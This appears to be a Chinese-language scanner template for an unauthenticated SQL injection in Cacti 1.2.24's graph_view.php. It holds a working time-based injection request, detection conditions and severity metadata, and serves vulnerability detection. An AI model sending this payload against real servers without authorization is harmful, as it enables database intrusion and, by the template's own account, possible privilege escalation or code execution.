验证漏洞存在方法
    - 发送SQL注入payload到graph_view.php，检查响应时间是否延迟10秒以上
    - 检查响应状态码是否为200且包含"Tree Mode"和"cacti"关键词

漏洞利用方法
    - Cacti 1.2.24版本在graph_view.php文件中存在SQL注入漏洞，攻击者可以通过构造恶意参数执行任意SQL查询
    - 由于默认情况下guest用户可以访问graph_view.php，攻击者无需认证即可利用此漏洞
    - 成功利用可导致数据泄露、权限提升甚至远程代码执行

PoC
```http
@timeout: 20s
GET /graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%2810%29%3B--+- HTTP/1.1
Host: {{Hostname}}
```

检测条件：
- 响应时间 >= 10秒
- 状态码 == 200
- 响应体包含"Tree Mode"和"cacti"关键词

影响版本：Cacti 1.2.24
修复版本：Cacti 1.2.25
漏洞类型：SQL注入
CVSS评分：9.8（严重）
CWE-ID：CWE-89
